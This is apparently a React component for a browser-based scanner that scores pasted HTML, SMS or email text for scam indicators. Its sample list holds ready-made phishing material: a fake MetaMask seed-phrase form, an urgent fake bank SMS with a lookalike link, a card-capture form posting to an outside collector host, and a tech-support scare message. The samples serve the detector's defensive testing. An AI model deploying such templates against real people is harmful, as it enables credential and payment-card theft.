import React, { useState } from 'react';
import { analyzeContentSnippet } from '../lib/contentHeuristics';
import { ContentAnalysisResult } from '../types/detector';
import { ShieldAlert, AlertTriangle, FileCode, CheckCircle2, Sparkles, RefreshCw } from 'lucide-react';

const SAMPLE_PAYLOADS = [
  {
    title: 'Crypto Wallet Seed Drainer',
    snippet: `<div class="wallet-recovery-container">
  <h2>Restore Your MetaMask Wallet</h2>
  <p>To prevent account deactivation, please enter your 12-word secret recovery phrase or mnemonic below:</p>
  <textarea name="seed_phrase" placeholder="word1 word2 word3..."></textarea>
  <button type="submit">Synchronize Private Key</button>
</div>`,
  },
  {
    title: 'Urgent Banking SMS / Coercion',
    snippet: `URGENT NOTICE: Your Chase Online access will be suspended within 24 hours due to unauthorized activity detected. Immediate action required. Please verify your debit card credentials and account password immediately at: http://chase-security-auth.top`,
  },
  {
    title: 'Fake 80% Counterfeit Sale Page',
    snippet: `<div class="product-banner">
  <h1>Nike Air Max Liquidation - 90% OFF TODAY ONLY!</h1>
  <p>Warehouse clearance sale today only. Free shipping worldwide today on all sneakers!</p>
  <form action="https://telegram-collector.io/api/submit" method="POST">
    <input type="text" name="cc_num" placeholder="Credit Card Number">
    <input type="password" name="cvv" placeholder="CVV Security Code">
  </form>
</div>`,
  },
  {
    title: 'Tech Support Virus Lockout',
    snippet: `CRITICAL ALERT: Windows Defender Error #0x8024402C. Trojan virus detected on your system. Do not shut down or restart your computer. Call Apple & Microsoft Support toll-free immediately at 1-800-459-2910 for remote assistance.`,
  },
];

export const ContentSandboxScanner: React.FC = () => {
  const [content, setContent] = useState(SAMPLE_PAYLOADS[0].snippet);
  const [result, setResult] = useState<ContentAnalysisResult>(() =>
    analyzeContentSnippet(SAMPLE_PAYLOADS[0].snippet)
  );

  const handleScan = () => {
    setResult(analyzeContentSnippet(content));
  };

  const handleLoadSample = (snippet: string) => {
    setContent(snippet);
    setResult(analyzeContentSnippet(snippet));
  };

  const getScoreColor = (score: number) => {
    if (score >= 80) return { text: 'text-emerald-400', border: 'border-emerald-500/30', bg: 'bg-emerald-500/10' };
    if (score >= 50) return { text: 'text-amber-400', border: 'border-amber-500/30', bg: 'bg-amber-500/10' };
    return { text: 'text-rose-400', border: 'border-rose-500/30', bg: 'bg-rose-500/10' };
  };

  const scoreStyle = getScoreColor(result.score);

  return (
    <div className="space-y-6">
      {/* Intro Header */}
      <div className="rounded-xl border border-slate-800 bg-slate-900/50 p-6">
        <h2 className="text-xl font-bold text-white tracking-tight">
          Page Source & Content Heuristic Sandbox
        </h2>
        <p className="mt-1 text-sm text-slate-300 max-w-3xl leading-relaxed">
          Inspect suspicious HTML source code, scam SMS messages, or deceptive email bodies directly in your browser. All analysis executes client-side with zero network uploads, safeguarding sensitive personal data.
        </p>

        {/* Quick sample buttons */}
        <div className="mt-4 flex flex-wrap items-center gap-2">
          <span className="text-xs text-slate-400">Load test scam payload:</span>
          {SAMPLE_PAYLOADS.map((sample, idx) => (
            <button
              key={idx}
              onClick={() => handleLoadSample(sample.snippet)}
              className="rounded bg-slate-800 px-2.5 py-1 text-xs text-slate-300 transition hover:bg-slate-700 hover:text-white"
            >
              {sample.title}
            </button>
          ))}
        </div>
      </div>

      {/* Editor & Results Split */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Left: Input Textarea */}
        <div className="flex flex-col rounded-xl border border-slate-800 bg-slate-900/60 p-5">
          <div className="flex items-center justify-between pb-3 border-b border-slate-800">
            <div className="flex items-center gap-2 text-xs font-semibold text-slate-200">
              <FileCode className="h-4 w-4 text-emerald-400" />
              <span>Input HTML / Text Snippet</span>
            </div>
            <span className="text-xs font-mono text-slate-400">
              {content.length} characters
            </span>
          </div>

          <textarea
            value={content}
            onChange={(e) => setContent(e.target.value)}
            rows={12}
            placeholder="Paste suspicious website HTML, email message, or SMS text..."
            className="mt-3 flex-1 w-full rounded-lg border border-slate-800 bg-slate-950 p-3 font-mono text-xs text-slate-200 placeholder:text-slate-600 focus:border-emerald-500 focus:outline-none focus:ring-1 focus:ring-emerald-500 resize-none leading-relaxed"
            spellCheck="false"
          />

          <div className="mt-4 flex items-center justify-between gap-3">
            <button
              onClick={() => setContent('')}
              className="text-xs text-slate-400 hover:text-slate-200 transition"
            >
              Clear Editor
            </button>
            <button
              onClick={handleScan}
              className="flex items-center gap-2 rounded-lg bg-emerald-500 px-5 py-2 text-xs font-semibold text-slate-950 transition hover:bg-emerald-400 active:scale-95"
            >
              <RefreshCw className="h-3.5 w-3.5" />
              <span>Run Content Analysis</span>
            </button>
          </div>
        </div>

        {/* Right: Heuristic Results */}
        <div className="flex flex-col rounded-xl border border-slate-800 bg-slate-900/60 p-5">
          <div className="flex items-center justify-between pb-3 border-b border-slate-800">
            <span className="text-xs font-semibold text-slate-200">
              Heuristic Inspection Verdict
            </span>
            <div className={`px-2.5 py-0.5 rounded text-xs font-bold font-mono border ${scoreStyle.border} ${scoreStyle.bg} ${scoreStyle.text}`}>
              Safety Score: {result.score}/100 ({result.riskLevel.toUpperCase()})
            </div>
          </div>

          <p className="mt-3 text-xs text-slate-300 leading-relaxed bg-slate-950/80 p-3 rounded border border-slate-800/80">
            {result.summary}
          </p>

          <div className="mt-4 flex-1">
            <h4 className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">
              Detected Deceptive Indicators ({result.detectedFlags.length})
            </h4>

            {result.detectedFlags.length === 0 ? (
              <div className="p-8 text-center text-xs text-slate-500 rounded bg-slate-950/40 border border-slate-800/50">
                No high-risk scam keywords or fraudulent forms detected.
              </div>
            ) : (
              <div className="space-y-2.5 max-h-[300px] overflow-y-auto pr-1">
                {result.detectedFlags.map((flag, idx) => (
                  <div
                    key={idx}
                    className="p-3 rounded-lg bg-slate-950/90 border border-slate-800/80"
                  >
                    <div className="flex items-center justify-between gap-2">
                      <span className="text-xs font-semibold text-slate-200">
                        {flag.title}
                      </span>
                      <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded uppercase ${
                        flag.severity === 'critical' ? 'text-rose-400 bg-rose-950/60 border border-rose-900/50' : 'text-amber-400 bg-amber-950/60 border border-amber-900/50'
                      }`}>
                        {flag.severity}
                      </span>
                    </div>
                    <p className="mt-1 text-xs text-slate-400 leading-relaxed">
                      {flag.explanation}
                    </p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
